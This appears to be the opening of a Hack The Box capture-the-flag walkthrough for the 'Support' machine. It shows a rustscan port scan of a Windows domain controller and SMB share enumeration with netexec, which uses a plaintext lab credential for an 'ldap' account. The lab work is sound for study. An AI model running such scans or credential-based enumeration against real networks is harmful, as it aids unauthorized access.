https://app.hackthebox.com/machines/Support

##  STEP 1
```sh
└─$ rustscan -a 10.129.230.181 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.181:53
Open 10.129.230.181:88
Open 10.129.230.181:135
Open 10.129.230.181:139
Open 10.129.230.181:389
Open 10.129.230.181:445
Open 10.129.230.181:464
Open 10.129.230.181:593
Open 10.129.230.181:636
Open 10.129.230.181:3268
Open 10.129.230.181:3269
Open 10.129.230.181:5985
Open 10.129.230.181:9389
Open 10.129.230.181:49664
Open 10.129.230.181:49667
Open 10.129.230.181:49678
Open 10.129.230.181:49683
Open 10.129.230.181:49707
10.129.230.181 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49707]
```


## STEP 2
guestでsmbれっきょ
```sh
└─$ netexec smb 10.129.230.181 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares                 
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ            Logon server share
```
